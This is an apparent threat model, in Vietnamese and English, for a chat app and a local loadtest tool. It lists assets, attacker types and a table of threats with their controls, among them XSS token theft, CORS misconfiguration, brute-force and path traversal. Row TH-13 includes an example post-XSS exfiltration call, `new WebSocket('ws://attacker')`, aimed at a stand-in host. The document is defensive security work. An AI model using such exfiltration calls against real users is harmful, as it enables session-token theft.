# THREAT-MODEL v0.2 — chat-app + loadtest tool

**Status**: ✅ VERIFIED — T-12 (2026-08-04): đối chiếu từng control với code FINAL sau khi build xong (T-01..T-11). Sửa TH-1/TH-7/TH-11 stale; thêm TH-14 (health false-ok). Nguồn: `docs/DESIGN-prod-refactor.md` (FINAL), `docs/DESIGN-prod-refactor-security.md` (threat table), `docs/UI-SPEC-prod-refactor.md`, code thật. G-9 (PRD §8): 1 trang, mỗi mục có control + task.
**Perimeter**: loadtest server = tool local tự host (`LOADTEST_HOST=127.0.0.1`, `loadtest/config.ts:91`); internet-facing surface = chat SPA (Vite/nginx) + gateway. LocalStorage **dùng chung** giữa chat + dashboard loadtest (cùng origin) → XSS chat = đánh cắp token admin loadtest.

## Assets
| ID | Asset | Nơi lưu | Vì sao quan trọng |
|---|---|---|---|
| A1 | `LOADTEST_AUTH_SECRET` | `loadtest/.env` + (xóa ở T-01) `dataDir/auth-secret.json` | Ký mọi session HMAC — compromise = forge admin token |
| A2 | `LOADTEST_OTP_SECRET` | `loadtest/.env` | Seed `otp:register:*` trong Redis; phải khớp gateway |
| A3 | `LOADTEST_DATABASE_URL` | `loadtest/.env` | Full history DB + admin_users + pool_accounts |
| A4 | `LOADTEST_REDIS_URL` | `loadtest/.env` | Write access OTP keys + queue-count |
| A5 | `pool_accounts.password` (plaintext) | Postgres + `dataDir/accounts-*.json` | Reusable test-account creds lên gateway |
| A6 | `admin_users.password_hash` (scrypt) | Postgres | Admin login |
| A7 | Access/refresh tokens (chat + pool) | `localStorage`, `accounts-*.json`, in-memory | Session impersonation |
| A8 | Run data / metrics / reports | Postgres + `docs/loadtest-reports/` | Operative intel (report không có token — verified) |
| A9 | Synthetic PII (email, device_info, DOB, country) | Postgres `pool_accounts` | Mass-residual PII |

## Actors
**T-ext** (external, không credential), **T-xss** (script trong browser nạn nhân), **T-admin** (token hợp lệ bị lộ/brute-force), **T-db** (DB leak), **T-insider** (clone repo / teammate).

## Threat table (STRIDE-flavored)
| # | Threat | L | I | Risk | Mức | Current control | Gap | Mitigation → Task |
|---|---|---|---|---|---|---|---|---|
| TH-1 | **Secret trong git history** (auth-secret, OTP, DB creds, accounts 1.3MB) | High | High | **Critical** | 🔴 | ✅ ĐÃ XỬ LÝ (T-01/T-02): secret rotated + backup ngoài repo (`%USERPROFILE%\.mayogu-secrets\`); `.gitignore` chặn `loadtest/data/*` (giữ `.gitkeep`); gitleaks CI `--fail-on-any` + pre-commit | Residual: repo chưa push remote → gitleaks CI chạy khi push (G-5 đang verify thủ công) | T-01 rotate+xoá+gitignore; T-02 gitleaks 0-finding + pre-commit |
| TH-2 | **XSS → token theft** (chat + loadtest admin cùng origin) | Medium | High | **High** | 🟠 | ✅ ĐÃ XỬ LÝ: CSP meta inject lúc build (`script-src 'self'`, không inline script, connect-src explicit origins — vite.config.ts `injectCspMeta`, verified trong dist); ErrorBoundary (không leak PII prod); `[DEBUG-LOGIN]` đã xoá (grep = 0); eslint `react/no-danger` (T-12: rule bật + MatchingScreen refactor hết sink) | CSP không chặn DOM-read localStorage (residual — Q-4) | T-08 CSP + ErrorBoundary + bỏ debug log; **U-1**: CSP chặn exfil (connect-src explicit origins, không wildcard) |
| TH-3 | **Brute-force admin login** | Medium | High | **High** | 🟠 | ✅ ĐÃ XỬ LÝ: rate-limit fail-window per IP — login/register 5 fail/60s → 429 + `Retry-After` + `X-RateLimit-*` (rate-limit.ts; api-server.ts dispatcher ghi fail post-response, 4xx = 1 fail — B-6); escape hatch `LOADTEST_RATE_LIMIT_DISABLED=1` (test/CI) | Tool nội bộ (127.0.0.1) — lộ khi bind 0.0.0.0 (cluster v1.1) | T-06 rate-limit 5 fail/60s/IP → 429 + `Retry-After` |
| TH-4 | **Register spam / admin mới** | Medium | Medium | **Medium** | 🟠 | ✅ ĐÃ XỬ LÝ: `LOADTEST_ALLOW_REGISTER=false` (mặc định) → 403 `REGISTER_DISABLED` trước body validation (api-server.ts route gate); frontend ẩn CTA đăng ký theo `/config.allowRegister` | Dev set `true` trong `loadtest/.env` (R-5) — cần nhớ set false khi prod | T-06 gate `LOADTEST_ALLOW_REGISTER=false` → 403; `/config.allowRegister` (T-09 ẩn CTA) |
| TH-5 | **CORS misconfig** (`*` + Bearer) | Medium | High | **High** | 🟠 | ✅ ĐÃ XỬ LÝ: `LOADTEST_CORS_ORIGIN` allowlist (default `http://localhost:5173` — R-7 Vite proxy), echo origin chính xác + `Vary: Origin`; origin lạ → KHÔNG set ACAO; KHÔNG `*` (http-server.ts `applyCors`); preflight OPTIONS 204 | Vite proxy `changeOrigin:true` phải nằm trong allowlist (R-2/R-7 — đã document README) | T-06 `CORS_ORIGIN` allowlist, echo origin, `Vary: Origin`; T-09 CORS-misconfig UX |
| TH-6 | **DB PII/credential leak** (`pool_accounts.password` plaintext) | Medium | Med-Hi | **Medium** | 🟡 | ✅ QUYẾT ĐỊNH CHỐT: **accept + document** (R-9/D-8 — AES key cùng host không chống được DB leak); `dataDir/accounts-*.json` git-ignored (T-01); **không API nào trả `password`** (verified — `/pools` chỉ metadata) | Plaintext vẫn at-rest (residual chấp nhận; AES-GCM v1.1 khi DB shared/remote) | T-12 accept+document (R-9); T-01 gitignore data; AES-GCM v1.1 |
| TH-7 | **Token trong URL query** (socket) | Medium | Medium | **Medium** | 🟠 | ✅ ĐÃ XỬ LÝ: client gửi token qua `auth: { token }` (socket.io CONNECT packet — `handshake.auth`) + `Authorization: Bearer` header; KHÔNG còn `query.token` (socket.ts:92-93, socket-farm.ts:100-101; grep = 0). **Browser native WebSocket KHÔNG gửi được header** (`extraHeaders` chỉ hoạt động ở polling/Node) → `auth` là đường duy nhất đảm bảo token tới gateway ở MỌI transport (FIX-2) | Gateway đọc `handshake.auth?.token` → `query?.token` → `headers?.authorization` (websocket.gateway.ts:147-150 — thay đổi 2 phía, commit ở repo gateway-auth-service riêng, mô tả T-12/README) | T-08 bỏ query + thêm `auth` ở cả 2 client; T-08 review (Socket/CodeReview) fix 2 phía; T-11 regression test |
| TH-8 | **Error/stack leakage** | Low-Med | Low | Low | 🟡 | ✅ ĐÃ XỬ LÝ: 500 → `{success:false, statusCode:500, message:'Lỗi server, xem log với requestId', requestId}` — KHÔNG trả `err.message` (api-server.ts catch); log full + `apiErrors` counter server-side; envelope `{success,statusCode,message,error?,requestId,timestamp}` | — | T-06/T-07 generic 500 + `requestId`; log full server-side |
| TH-9 | **Path traversal qua runId** | Low | Medium | Low | 🟡 | ✅ ĐÃ XỬ LÝ (defense-in-depth — REFUTED trước đó): format check `/^lt[a-z0-9-]{2,24}$/i` trước `decodeURIComponent` + `path.resolve` prefix assert ở cleanup (http-server.ts) | (REFUTED — `%2F` không tới filesystem; cleanup exact-match id server-gen) | T-06 format check `/^lt[a-z0-9-]{2,24}$/i` + `path.resolve` prefix — **defense-in-depth** |
| TH-10 | **localhost CSRF / DNS rebinding** | Low | Medium | Low | 🟡 | CORS chặn đọc response (không chặn thực thi) + mọi write route auth-gated + register gate 403 | Đã document (TH-10 này + README) — `Sec-Fetch-Site` check để v1.1 | T-12 document; control = CORS + auth-gated writes + register gate; `Sec-Fetch-Site` check để v1.1 |
| TH-11 | **B-1: Plaintext password/hash vào logs** (QueryResult error + JSONL sink) | Med | High | **High** | 🟠 | ✅ ĐÃ XỬ LÝ (T-05/T-07): write query → error chỉ `{code,message}` (không sql/params); read query → `redactSql`+`redactParams`; logger guard `redactSensitiveFields` + `redactMsg` ở MỌI sink. **JSONL sink thật**: `LOGTEST_LOG_FILE` (append, rotation 10MB ×5 file, `.env.example:87`, logger.ts) — entry JSON `{ts,level,msg,runId?,requestId?,context?}` đều qua redact trước khi ghi | Không có test assert JSONL không chứa secret (gap thấp — guard ở tầng emit) | T-05 redaction; T-07 logger `redactSensitiveFields`/`redactMsg`; T-12 document `LOGTEST_LOG_FILE` |
| TH-12 | **B-2: Shutdown mất finalize** (run kẹt `status='running'`, history half-written) | Med | Med | **Medium** | 🟠 | ✅ ĐÃ XỬ LÝ: finalize barrier — `finishRun` **await** `writeRunFinish`; `DbWriter.shutdown()` await `finalizePromise` trước `pool.end()`; graceful shutdown thứ tự HTTP đóng → `coordinator.stop(true)` → flush → exit, tổng timeout `LOADTEST_SHUTDOWN_TIMEOUT_MS` 10s (server.ts, writer.ts) | — (T-11 shutdown test mid-run đã chốt trong plan) | T-06 finalize barrier (await `writeRunFinish` + `finalizePromise` trước `pool.end()`); T-11 shutdown test |
| TH-13 | **U-1: CSP exfil qua `ws:`/`wss:` wildcard** (post-XSS `new WebSocket('ws://attacker')`) | Med | High | **High** | 🟠 | ✅ ĐÃ XỬ LÝ: connect-src = explicit origins — `'self'` + 2 font origins + origin `VITE_GATEWAY_URL` (default localhost:3000) + `VITE_CSP_CONNECT_SRC`; KHÔNG scheme-wildcard `ws:`/`wss:` (vite.config.ts `injectCspMeta`, verified trong dist — W3 Reality Check) | Nếu build không set `VITE_GATEWAY_URL` → connect-src dùng default localhost:3000 (khớp env.ts — an toàn, chỉ lệch khi gateway thật khác origin) | T-08 connect-src **explicit origins** (gateway origin + Vite + fonts); không wildcard; `VITE_CSP_CONNECT_SRC` cho gateway khác origin |
| TH-14 | **Health endpoint báo `ok` giả khi DB down** (trước: `/health` chỉ `{status:'ok'}` — autoscaler/healthcheck không thấy hỏng, run chạy không ghi history im lặng) | Med | Med | **Medium** | 🟠 | ✅ ĐÃ XỬ LÝ: `buildHealth` trả `{status: ok|degraded|down, db, redis, workers, version, uptimeSec, timestamp}`; DB down → `degraded`/`down` (KHÔNG 500, KHÔNG `ok` giả); `workers` phản ánh aliveness thật; probe db/redis cache 10s (`createHealthProbe` — health.ts); route `GET /api/loadtest/health` (api-server.ts) | Docker healthcheck phải chấp nhận `degraded` (HTTP 200 — container sống; D-25 — đã xử lý trong Dockerfile.loadtest T-12) | T-07 health degraded/down (no false-ok); T-12 Docker healthcheck `wget /api/loadtest/health` + README |

## Residual risks (accepted, documented)
- **localStorage** (Q-4): CSRF/CSP không chặn DOM read; token chat + loadtest cùng origin → residual XSS→token theft. Control: CSP chặn exfil + admin token 12h không refresh (bounded window) + không `dangerouslySetInnerHTML` user content (MatchingScreen refactor ra JSX — T-12; eslint `react/no-danger` (T-12: rule bật + MatchingScreen refactor hết sink) enforced).
- **`frame-ancestors`** (meta CSP không enforce — D-10): clickjacking thấp (Bearer + tool nội bộ); **đã delegate nginx header riêng**: `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` (docker/nginx.conf, T-12).
- **`pool_accounts.password` plaintext** (R-9): DB leak = all-or-nothing (AES key cùng host không chống được); accept + document, AES-GCM v1.1; không API nào trả `password` (verified).
- **1 coordinator = 1 run** (S-8): đã chốt, document README (T-12).
- **OTP weak-RNG** (Math.random): đã fix `crypto.randomInt` (D-13) — OTP HMAC + verify cap 5 attempts, không phải vulnerability.
- **`docs/loadtest-reports/*`**: chứa config (gatewayUrl, target) không token — giữ 1 sample (G-7), gitignore phần còn lại (quyết định mở nhỏ, ko chặn).
- **Browser WS-auth là dependency deploy xuyên repo**: gateway đọc `handshake.auth?.token` đầu tiên (websocket.gateway.ts:147-150) — thay đổi nằm ở repo `gateway-auth-service`, phải deploy cùng/trước chat-app (README "Triển khai gateway change", T-12).

## Control map (tài liệu cần)
- Token flow: `docs/DESIGN-prod-refactor.md` §7, `docs/UI-SPEC-prod-refactor.md` §2; CSP: UI-SPEC §2 + `vite.config.ts` `injectCspMeta`; rate-limit/CORS/register gate: DESIGN §2/§7 + `loadtest/rate-limit.ts`/`http-server.ts`; pool plaintext: TH-6 (v1.1 AES-GCM, R-9); shutdown: DESIGN §6 + `server.ts`; log redaction: DESIGN §4.2 + `loadtest/logger.ts`; health: DESIGN §5.3 + `loadtest/health.ts` (TH-14); deploy/Docker: README + `docker/` (T-12).